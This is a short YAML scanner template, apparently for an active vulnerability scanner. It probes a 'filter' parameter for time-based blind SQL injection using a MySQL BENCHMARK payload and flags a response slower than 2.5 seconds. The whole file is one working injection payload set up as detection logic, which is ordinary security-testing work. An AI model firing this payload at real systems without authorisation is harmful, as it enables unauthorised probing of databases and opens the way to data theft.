id: sqli3-time-045
name: 'Time-blind delay in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - ''' AND BENCHMARK(5000000,MD5(1))--'
    matchers:
      - type: time
        ms: 2500
